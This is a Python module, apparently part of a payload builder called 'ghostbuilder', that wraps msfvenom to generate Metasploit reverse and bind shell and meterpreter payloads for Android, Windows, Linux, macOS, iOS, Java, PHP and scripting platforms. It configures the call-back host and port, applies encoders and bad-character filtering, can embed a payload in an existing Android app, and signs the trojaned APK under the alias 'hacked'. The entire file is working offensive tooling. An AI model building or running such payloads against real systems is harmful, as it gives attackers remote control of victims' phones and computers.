# Developer: Sreeraj
# GitHub: https://github.com/s-r-e-e-r-a-j

from typing import Optional, List
from .utils import run_cmd, info, ok, fail, warn, ask
import os

MAP = {
    'android_tcp': 'android/meterpreter/reverse_tcp',
    'android_http': 'android/meterpreter/reverse_http',
    'android_https': 'android/meterpreter/reverse_https',
    'windows_reverse_tcp': 'windows/meterpreter/reverse_tcp',
    'windows_reverse_https': 'windows/meterpreter/reverse_https',
    'windows_reverse_http': 'windows/meterpreter/reverse_http',
    'windows_bind_tcp': 'windows/meterpreter/bind_tcp',
    'windows_shell_reverse_tcp': 'windows/shell/reverse_tcp',
    'windows_shell_bind_tcp': 'windows/shell/bind_tcp', 
    'windows_x64_meterpreter_reverse_tcp': 'windows/x64/meterpreter/reverse_tcp',
    'windows_x64_meterpreter_reverse_https': 'windows/x64/meterpreter/reverse_https',
    'linux_x86_meterpreter_reverse_http': 'linux/x86/meterpreter_reverse_http',
    'linux_x86_meterpreter_reverse_https': 'linux/x86/meterpreter_reverse_https',
    'linux_x86_meterpreter_reverse_tcp': 'linux/x86/meterpreter/reverse_tcp',
    'linux_x64_meterpreter_reverse_http': 'linux/x64/meterpreter_reverse_http',
    'linux_x64_meterpreter_reverse_https': 'linux/x64/meterpreter_reverse_https',
    'linux_x64_meterpreter_reverse_tcp': 'linux/x64/meterpreter/reverse_tcp',
    'linux_x86_shell_reverse_tcp': 'linux/x86/shell/reverse_tcp',
    'linux_x64_shell_bind_tcp': 'linux/x64/shell/bind_tcp',
    'linux_x86_meterpreter_bind_tcp': 'linux/x86/meterpreter/bind_tcp',
    'linux_x64_meterpreter_bind_tcp': 'linux/x64/meterpreter/bind_tcp',
    'linux_x86_shell_bind_tcp': 'linux/x86/shell/bind_tcp',
    'linux_x64_shell_reverse_tcp': 'linux/x64/shell/reverse_tcp',
    'linux_zarch_meterpreter_reverse_tcp': 'linux/zarch/meterpreter_reverse_tcp',
    'linux_zarch_meterpreter_reverse_http': 'linux/zarch/meterpreter_reverse_http',
    'linux_zarch_meterpreter_reverse_https': 'linux/zarch/meterpreter_reverse_https',
    'linux_aarch64_meterpreter_reverse_tcp': 'linux/aarch64/meterpreter_reverse_tcp',
    'linux_aarch64_meterpreter_reverse_http': 'linux/aarch64/meterpreter_reverse_http',
    'linux_aarch64_meterpreter_reverse_https': 'linux/aarch64/meterpreter_reverse_https',
    'linux_armle_meterpreter_reverse_tcp': 'linux/armle/meterpreter_reverse_tcp',
    'linux_armle_meterpreter_reverse_http': 'linux/armle/meterpreter_reverse_http',
    'linux_armle_meterpreter_reverse_https': 'linux/armle/meterpreter_reverse_https',
    'macos_x86_shell_reverse_tcp': 'osx/x86/shell_reverse_tcp',
    'macos_x86_shell_bind_tcp': 'osx/x86/shell_bind_tcp',
    'macos_x64_meterpreter_bind_tcp': 'osx/x64/meterpreter/bind_tcp',
    'macos_x64_meterpreter_reverse_tcp': 'osx/x64/meterpreter/reverse_tcp',
    'macos_x64_meterpreter_reverse_http': 'osx/x64/meterpreter_reverse_http',
    'macos_x64_meterpreter_reverse_https': 'osx/x64/meterpreter_reverse_https',
    'ios_aarch64_meterpreter_reverse_http': 'apple_ios/aarch64/meterpreter_reverse_http',
    'ios_aarch64_meterpreter_reverse_https': 'apple_ios/aarch64/meterpreter_reverse_https',
    'ios_aarch64_meterpreter_reverse_tcp': 'apple_ios/aarch64/meterpreter_reverse_tcp',
    'ios_aarch64_shell_reverse_tcp': 'apple_ios/aarch64/shell_reverse_tcp',
    'ios_armle_meterpreter_reverse_http': 'apple_ios/armle/meterpreter_reverse_http',
    'ios_armle_meterpreter_reverse_https': 'apple_ios/armle/meterpreter_reverse_https',
    'ios_armle_meterpreter_reverse_tcp': 'apple_ios/armle/meterpreter_reverse_tcp',
    'windows_powershell_reverse_tcp': 'windows/powershell_reverse_tcp',
    'java_meterpreter_reverse_tcp': 'java/meterpreter/reverse_tcp',
    'php_meterpreter_reverse_tcp': 'php/meterpreter_reverse_tcp',
    'jsp_shell_reverse_tcp': 'java/jsp_shell_reverse_tcp',
    'jsp_shell_bind_tcp': 'java/jsp_shell_bind_tcp',
    'windows_aspx_reverse_tcp': 'windows/meterpreter/reverse_tcp',
    'windows_aspx_reverse_http': 'windows/meterpreter/reverse_http',
    'windows_aspx_reverse_https': 'windows/meterpreter/reverse_https',
    'windows_x64_aspx_reverse_tcp': 'windows/x64/meterpreter/reverse_tcp',
    'windows_x64_aspx_reverse_https':'windows/x64/meterpreter/reverse_https',
    'python_shell_reverse_tcp': 'python/shell_reverse_tcp',
    'ruby_shell_reverse_tcp': 'ruby/shell_reverse_tcp',
    'unix_shell_reverse_tcp': 'cmd/unix/reverse',
    'nodejs_shell_reverse_tcp': 'nodejs/shell_reverse_tcp',
    'perl_reverse_tcp': 'cmd/unix/reverse_perl',
    'bash_reverse_tcp': 'cmd/unix/reverse_bash',
    'java_meterpreter_reverse_http': 'java/meterpreter/reverse_http',
    'java_meterpreter_reverse_https': 'java/meterpreter/reverse_https',
    'java_meterpreter_bind_tcp': 'java/meterpreter/bind_tcp'
}

FMT = {
    'android_tcp': 'apk',
    'android_http': 'apk',
    'android_https': 'apk',
    'windows_reverse_tcp': 'exe',
    'windows_reverse_https': 'exe',
    'windows_reverse_http': 'exe',
    'windows_bind_tcp': 'exe',
    'windows_shell_reverse_tcp': 'exe',
    'windows_shell_bind_tcp': 'exe',
    'windows_x64_meterpreter_reverse_tcp': 'exe',
    'windows_x64_meterpreter_reverse_https': 'exe',
    'linux_x86_meterpreter_reverse_http': 'elf',
    'linux_x86_meterpreter_reverse_https': 'elf',
    'linux_x86_meterpreter_reverse_tcp': 'elf',
    'linux_x64_meterpreter_reverse_http': 'elf',
    'linux_x64_meterpreter_reverse_https': 'elf',
    'linux_x64_meterpreter_reverse_tcp': 'elf',
    'linux_x86_shell_reverse_tcp': 'elf',
    'linux_x64_shell_bind_tcp': 'elf',
    'linux_x86_meterpreter_bind_tcp': 'elf',
    'linux_x64_meterpreter_bind_tcp': 'elf',
    'linux_x86_shell_bind_tcp': 'elf',
    'linux_x64_shell_reverse_tcp': 'elf',
    'linux_zarch_meterpreter_reverse_tcp': 'elf',
    'linux_zarch_meterpreter_reverse_http': 'elf',
    'linux_zarch_meterpreter_reverse_https': 'elf',
    'linux_aarch64_meterpreter_reverse_tcp': 'elf',
    'linux_aarch64_meterpreter_reverse_http': 'elf',
    'linux_aarch64_meterpreter_reverse_https': 'elf',
    'linux_armle_meterpreter_reverse_tcp': 'elf',
    'linux_armle_meterpreter_reverse_http': 'elf',
    'linux_armle_meterpreter_reverse_https': 'elf',
    'macos_x86_shell_reverse_tcp': 'macho',
    'macos_x86_shell_bind_tcp': 'macho',
    'macos_x64_meterpreter_bind_tcp': 'macho',
    'macos_x64_meterpreter_reverse_tcp': 'macho',
    'macos_x64_meterpreter_reverse_http': 'macho',
    'macos_x64_meterpreter_reverse_https': 'macho',
    'ios_aarch64_meterpreter_reverse_http': 'macho',
    'ios_aarch64_meterpreter_reverse_https': 'macho',
    'ios_aarch64_meterpreter_reverse_tcp': 'macho',
    'ios_aarch64_shell_reverse_tcp': 'macho',
    'ios_armle_meterpreter_reverse_http': 'macho',
    'ios_armle_meterpreter_reverse_https': 'macho',
    'ios_armle_meterpreter_reverse_tcp': 'macho',
    'windows_powershell_reverse_tcp': 'ps1',
    'java_meterpreter_reverse_tcp': 'jar',
    'php_meterpreter_reverse_tcp': 'raw',
    'jsp_shell_reverse_tcp': 'raw',
    'jsp_shell_bind_tcp': 'raw',
    'windows_aspx_reverse_tcp': 'aspx',
    'windows_aspx_reverse_http': 'aspx',
    'windows_aspx_reverse_https': 'aspx',
    'windows_x64_aspx_reverse_tcp': 'aspx',
    'windows_x64_aspx_reverse_https': 'aspx',
    'python_shell_reverse_tcp': 'raw',
    'ruby_shell_reverse_tcp': 'raw',
    'unix_shell_reverse_tcp': 'raw',
    'nodejs_shell_reverse_tcp': 'raw',
    'perl_reverse_tcp': 'raw',
    'bash_reverse_tcp': 'raw',
    'java_meterpreter_reverse_http': 'jar',
    'java_meterpreter_reverse_https': 'jar',
    'java_meterpreter_bind_tcp': 'jar'
}

def build_cmd(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, encoder: Optional[str] = None, iterations: int = 1, badchars: Optional[str] = None) -> List[str]:
    payload = MAP.get(key)
    if not payload:
        raise ValueError('unknown payload')
    cmd: List[str] = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}']
    if infile and key.startswith('android'):
        cmd += ['-x', infile]

    is_android = key.startswith('android')
    is_ios = key.startswith('ios')
    is_macos = key.startswith('macos')
    is_script = any(key.startswith(x) for x in ['python', 'ruby', 'nodejs', 'bash', 'perl', 'unix'])
    is_web = any(key.startswith(x) for x in [ 'php', 'jsp', 'java'])
    is_linux_arm = any(key.startswith(x) for x in ['linux_armle','linux_aarch64','linux_zarch'])
    if encoder:
        if 'x86' in encoder and 'x64' in key:
             warn('[!] x86 encoder on x64 payload may fail')
        if 'x64' in encoder and 'x86' in key:
             warn('[!] x64 encoder on x86 payload will fail')
        if is_android or is_ios:
            info('[!] Encoders are NOT supported for Android/iOS. Skipping...')
        elif is_script or is_web:
              info('[!] Encoders are NOT applicable for script/web payloads. Skipping...')
        elif is_linux_arm:
              info('[!] Encoders not supported for ARM/zarch payloads. Skipping...')
        elif is_macos:
              info('[!] macOS encoder support is limited. Payload may fail.')
              cmd += ['-e', encoder]
              if iterations > 1:
                  cmd += ['-i', str(iterations)]
        else:
             cmd += ['-e', encoder]
             if iterations > 1:
                 cmd += ['-i', str(iterations)]

    if not badchars and not (is_script or is_web or is_android or is_ios or is_linux_arm):
        use_default = ask('[?] Use default badchars (\\x00\\x0a\\x0d)? (y/N): ').strip().lower()
        if use_default == 'y':
            badchars = "\\x00\\x0a\\x0d"
            info('[*] Using default badchars: \\x00\\x0a\\x0d') 
    if badchars:
        if is_android or is_ios:
            info('[!] Badchars not supported for Android/iOS. Skipping...')
        elif is_script or is_web:
            info('[!] Badchars not applicable for script/web payloads. Skipping...')
        else:
             cmd += ['-b', badchars]
    fmt = FMT.get(key)
    if fmt:
        cmd += ['-f', fmt]
    cmd += ['-o', out]
    return cmd

def generate(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, encoder: Optional[str] = None, iterations: int = 1, badchars: Optional[str] = None, dry: bool = False) -> bool:
    cmd = build_cmd(key, lhost, lport, out, infile, encoder, iterations, badchars)
    info(' '.join(cmd))
    if dry:
        info('dry run - not executing')
        return True
    rc = run_cmd(cmd)
    if rc == 0 and os.path.exists(out):
        ok(f'generated: {out}')
        return True
    fail('msfvenom failed or output missing')
    return False


def android_sign(apk: str, final: str) -> bool:
    keystore = 'ghostbuilder.keystore'
    gen = ['keytool', '-genkey', '-v', '-keystore', keystore, '-alias', 'hacked', '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000']
    rc = run_cmd(gen)
    if rc != 0:
        fail('keytool failed')
        return False
    sign = ['jarsigner', '-verbose', '-sigalg', 'SHA1withRSA', '-digestalg', 'SHA1', '-keystore', keystore, apk, 'hacked']
    rc = run_cmd(sign)
    if rc != 0:
        fail('jarsigner failed')
        return False
    verify = ['jarsigner', '-verify', '-verbose', '-certs', apk]
    run_cmd(verify)
    align = ['zipalign', '-v', '4', apk, final]
    rc = run_cmd(align)
    if rc != 0:
        fail('zipalign failed')
        return False
    run_cmd(['rm', '-f', keystore])
    ok(f'signed: {final}')
    return True
